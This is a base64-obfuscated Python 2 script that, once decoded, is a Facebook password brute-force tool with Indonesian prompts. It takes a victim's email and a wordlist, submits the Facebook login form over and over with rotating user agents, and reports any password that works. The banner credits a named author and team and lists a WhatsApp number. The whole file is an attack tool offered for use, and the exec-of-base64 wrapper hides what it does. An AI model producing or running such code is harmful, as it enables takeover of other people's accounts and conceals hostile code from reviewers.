import base64
exec(base64.b64decode('IyF1c3IKIyAtKi0gY29kaW5nOiBVVEYtOCAtKi0KIyBIYXlvIG1hdSBuZ2FwYWluCgoKaW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHJhbmRvbQppbXBvcnQgY29va2llbGliCmltcG9ydCBtZWNoYW5pemUKCndkID0gIlwwMzNbOTA7MW0iICMgZGFyawpHTCA9ICJcMDMzWzk2OzFtIiAjIEJsdWUgYXF1YQpCQiA9ICJcMDMzWzM0OzFtIiAjIEJsdWUgbGlnaHQKWVkgPSAiXDAzM1szMzsxbSIgIyBZZWxsb3cgbGlnaHQKR0cgPSAiXDAzM1szMjsxbSIgIyBHcmVlbiBsaWdodApXVyA9ICJcMDMzWzA7MW0iICAjIFdoaXRlIGxpZ2h0ClJSID0gIlwwMzNbMzE7MW0iICMgUmVkIGxpZ2h0CkNDID0gIlwwMzNbMzY7MW0iICMgQ3lhbiBsaWdodApCID0gIlwwMzNbMzRtIiAgICAjIEJsdWUKWSA9ICJcMDMzWzMzOzFtIiAgICAjIFllbGxvdwpHID0gIlwwMzNbMzJtIiAgICAjIEdyZWVuClcgPSAiXDAzM1swOzFtIiAgICAgIyBXaGl0ZQpSID0gIlwwMzNbMzFtIiAgICAjIFJlZApDID0gIlwwMzNbMzY7MW0iICAgICMgQ3lhbgoKZGVmIHJ1bm50eHQocyk6CiAgICAgICAgZm9yIG5vb2JzIGluIHMgKyAnXG4nOgogICAgICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShub29icykKICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxMC4gLyAyMTAwKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKZGVmIGJhbm5lcigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCAiICIKICAgIHJ1bm50eHQoR0wrIiAgICAgICAgICAgICAgICAg4pmlIFdFTENPTUUg4pmlIikKICAgIHRpbWUuc2xlZXAoMS41KQogICAgcHJpbnQgR0crIiAgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgogICAgcHJpbnQgR0wrIiAgICAgICAgICBCUlVURSBGT1JDRSBGQUNFQk9PSyBNSU5JIFYxIgogICAgcHJpbnQgR0crIiAgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgogICAgcHJpbnQgR0wrIiAgICAgICAgICAgICAgQmFjYSBCaXNtaWxsYWggRHVsdSB5YWFhIgogICAgcHJpbnQgWSsi4pmmIENyZWF0ZWQgOiBSQU5HR0EiCiAgICBwcmludCBZKyLimaYgVGVhbSA6IFRvZGFuU1ciCiAgICBwcmludCBZKyLimaYgV2hhdHNhcHAgOisxICg2MzkpIDM5My0wMzU2IgogICAgcHJpbnQgR0crIiAgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IgoKYmFubmVyICgpCgplbWFpbF90YXJnZXQgPSBzdHIocmF3X2lucHV0KEdMKyJcMDMzWzkybU1hc3Vra2FuIEVtYWlsIFRhcmdldCA9PlwwMzNbOTNtICAiKSkKcGFzc3dvcmRfbGlzdCA9IHN0cihyYXdfaW5wdXQoR0crIk1hc3Vra2FuIHBhc3MudHh0ID0+XDAzM1s5M20gIikpCmxvZ2luID0gJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi5waHA/bG9naW5fYXR0ZW1wdD0xJwp1c2VyYWdlbnRzID0gWygnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo0NS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQ1LjAnLCdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2OyBlbi1VUzsgcnY6MS45LjAuMSkgR2VjaycpXQojIHVzZXJhZ2VudHMgPSBbKCdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjAuMC4zMTEyLjExMyBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjAuMC4zMTEyLjkwIFNhZmFyaS81MzcuMzYnLCdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA1LjE7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS82MC4wLjMxMTIuOTAgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMjsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYwLjAuMzExMi45MCBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDQuMC4yNDAzLjE1NyBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4zOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjAuMC4zMTEyLjExMyBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU3LjAuMjk4Ny4xMzMgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU3LjAuMjk4Ny4xMzMgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81NS4wLjI4ODMuODcgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2JywpXQoKZGVmIHBpbCgpOgogICAgICAgICAgICAgICAgcHJpbnQgR0crIiAiCiAgICAgICAgICAgICAgICBnID0gc3RyKHJhd19pbnB1dCgiWz9dIENvYmEgTGFnaSA/XDAzM1s5MzsxbVt5L25dOiAiKSkKICAgICAgICAgICAgICAgIGlmIGcgPT0gJ3knIG9yIGcgPT0gJ1knOgogICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncHl0aG9uMiBqay5weScpCiAgICAgICAgICAgICAgICBlbGlmIGcgPT0gJ24nIG9yIGcgPT0gJ04nOgogICAgICAgICAgICAgICAgICAgIHByaW50IHdkKyJLZWx1YXIgZGFyaSBwcm9ncmFtLi4uIgogICAgICAgICAgICAgICAgICAgIHN5cy5leGl0KCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgUlIrIlBpbGloIHlhbmcgYmVuZXIgY3VrLi4uIgogICAgICAgICAgICAgICAgICAgIHBpbCgpCgpkZWYgZWRpdF93b3JkbGlzdCgpOgoKICAgICAgICBwcmludCBHRysiICIKICAgICAgICBlZCA9IHN0cihyYXdfaW5wdXQoIls/XSBFZGl0IHdvcmRsaXN0IGJvcz8gXDAzM1s5NjsxbVt5L25dOiAiKSkKICAgICAgICBpZiBlZCA9PSAneScgb3IgZWQgPT0gJ1knOgogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCduYW5vICcrcGFzc3dvcmRfbGlzdCkKICAgICAgICAgICAgICAgIHBpbCgpCiAgICAgICAgZWxpZiBlZCA9PSAnbicgb3IgZWQgPT0gJ04nOgogICAgICAgICAgICAgICAgcHJpbnQgd2QrIktlbHVhciBEYXJpIFByb2dyYW0uLi4iCiAgICAgICAgICAgICAgICBzeXMuZXhpdCgpCgogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludCBSUisiUGlsaWggeWcgYmVuZXIuLi4iCiAgICAgICAgICAgICAgICBlZGl0X3dvcmRsaXN0KCkKCmRlZiBtYWluKCk6CglnbG9iYWwgbm9vYnMKICAgICAgICBub29icyA9IG1lY2hhbml6ZS5Ccm93c2VyKCkKICAgICAgICBjaiA9IGNvb2tpZWxpYi5MV1BDb29raWVKYXIoKQogICAgICAgIG5vb2JzLnNldF9oYW5kbGVfcm9ib3RzKEZhbHNlKQogICAgICAgIG5vb2JzLnNldF9oYW5kbGVfcmVkaXJlY3QoVHJ1ZSkKICAgICAgICBub29icy5zZXRfY29va2llamFyKGNqKQogICAgICAgIG5vb2JzLnNldF9oYW5kbGVfZXF1aXYoVHJ1ZSkKICAgICAgICBub29icy5zZXRfaGFuZGxlX3JlZmVyZXIoVHJ1ZSkKICAgICAgICBub29icy5zZXRfaGFuZGxlX3JlZnJlc2gobWVjaGFuaXplLl9odHRwLkhUVFBSZWZyZXNoUHJvY2Vzc29yKCksIG1heF90aW1lPTEpCiAgICAgICAgcnVubl9ub29icygpCiAgICAgICAgbGlmZSgpCiAgICAgICAgcHJpbnQgIiAiCiAgICAgICAgcHJpbnQgUlIrIiB3b3JkbGlzdCB0aWRhayBhZGEgeWcgY29jb2suLi4iCiAgICAgICAgcHJpbnQgIiAiCmRlZiBCTEFOSyhoYWNrX3Bhc3N3b3JkKToKICB0cnk6CiAgCXN5cy5zdGRvdXQud3JpdGUoR0crIlxuW1wwMzNbOTFtK1wwMzNbOTJtXVwwMzNbOTE7MW0gW1wwMzNbOTdtIitlbWFpbF90YXJnZXQrIlwwMzNbOTFtXVwwMzNbOTBtIE1lbmNvYmEgPT0+IFwwMzNbOTFtW1wwMzNbOTA7MW0iK2hhY2tfcGFzc3dvcmQpCglzeXMuc3Rkb3V0LmZsdXNoKCkKCW5vb2JzLmFkZGhlYWRlcnMgPSBbKCdVc2VyLWFnZW50JywgcmFuZG9tLmNob2ljZSh1c2VyYWdlbnRzKSldCglzaXRlID0gbm9vYnMub3Blbihsb2dpbikKCW5vb2JzLnNlbGVjdF9mb3JtKG5yID0gMCkKCW5vb2JzLmZvcm1bJ2VtYWlsJ10gPSBlbWFpbF90YXJnZXQKCW5vb2JzLmZvcm1bJ3Bhc3MnXSA9IGhhY2tfcGFzc3dvcmQKCXRvbSA9IG5vb2JzLnN1Ym1pdCgpCgltYXNrID0gdG9tLmdldHVybCgpCglpZiBtYXNrICE9IGxvZ2luIGFuZCAobm90ICdsb2dpbl9hdHRlbXB0JyBpbiBtYXNrKToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIiAiCgkJCXByaW50ICgiXDAzM1s5Nm0gICAgICAgICAgICAgICAgUyBVIEMgQyBFIFMgUyIpCgkJCXByaW50ICIgICAgICAgICAgUCBBIFMgUyBXIE8gUiBEICBGIEkgTiBEICIKICAgICAgICAgICAgICAgICAgCXByaW50IFJSKyIrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsiCgkgICAgICAgICAJcHJpbnQgKFJSKyIjXDAzM1s5N20gSUQgLyBFbWFpbCBUYXJnZXQ6XDAzM1s5Mm0ge30iKS5mb3JtYXQoZW1haWxfdGFyZ2V0KQogICAgICAgIAkgICAgICAgIHByaW50IChSUisiI1wwMzNbOTdtIFBhc3N3b3JkIFRhcmdldDpcMDMzWzkybSB7fSIpLmZvcm1hdChoYWNrX3Bhc3N3b3JkKQogICAgICAgIAkgICAgICAgIHByaW50ICIgIgogICAgICAgIAkgICAgICAgIHJhd19pbnB1dChXVysiVEVLQU4gRU5URVIgVU5UVUsgS0VMVUFSLi4uIikKCQkJc3lzLmV4aXQoMSkKCQkJCgkKICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgIHByaW50IHdkKyJTdG9wLi4uLi4uLiIKICAgICAgZWRpdF93b3JkbGlzdCgpCiAgICAgIHN5cy5leGl0KCkgICAgCSAgICAKZGVmIGxpZmUoKToKCWdsb2JhbCBoYWNrX3Bhc3N3b3JkCglwYXNzd29yZF9ub2IgPSBvcGVuKHBhc3N3b3JkX2xpc3QsICJyIikKCWZvciBoYWNrX3Bhc3N3b3JkIGluIHBhc3N3b3JkX25vYjoKCQlwYXNzd29yZF9ub2IgPSBoYWNrX3Bhc3N3b3JkLnJlcGxhY2UoIlxuIiwiIikKCQlCTEFOSyhoYWNrX3Bhc3N3b3JkKQkJCgpkZWYgcnVubl9ub29icygpOgogICAgICAgICBnbG9iYWwgcGFzc3dvcmRfbGlzdAogICAgICAgICAKICAgICAgICAgbG9wID0gR0crIiIiCiAgICAgICAgICAgICBcMDMzWzkwOzFtc2l4dHlzaXgtaGFja3RlYW1cMDMzWzkxOzFtCiAgICAgICAgICAgICBDcmVhdG9yIGJ5OlwwMzNbOTdtIEJMQU5LCiAgICAgICIiIgogICAgICAKICAgICAgCiAgICAgICAgIHByaW50IGxvcAogICAgICAgICBudXViID0gb3BlbihwYXNzd29yZF9saXN0LCAncicpCiAgICAgICAgIG51dWIgPSBudXViLnJlYWRsaW5lcygpCiAgICAgICAgIHByaW50IHdkKyIgWyNdIElEIC8gVXNlcm5hbWUgVGFyZ2V0XDAzM1s5NzsxbToge30iLmZvcm1hdChlbWFpbF90YXJnZXQpCiAgICAgICAgIHByaW50IHdkKyIgWyNdIEpVbWxhaCBQYXNzd29yZCBzYWF0IGluaVwwMzNbOTc7MW06IiwgbGVuKG51dWIpLCdwYXNzd29yZCcKICAgICAgICAgcHJpbnQgd2QrIiBbI10gVHVuZ2d1IFByb3NlcyBDcmFja2luZ1wwMzNbOTc7MW0uLi4uLi4uLi4uIgogICAgICAgICBwcmludCAiICIKCmlmIF9fbmFtZV9fPT0nX19tYWluX18nOgoJbWFpbigpCQo='))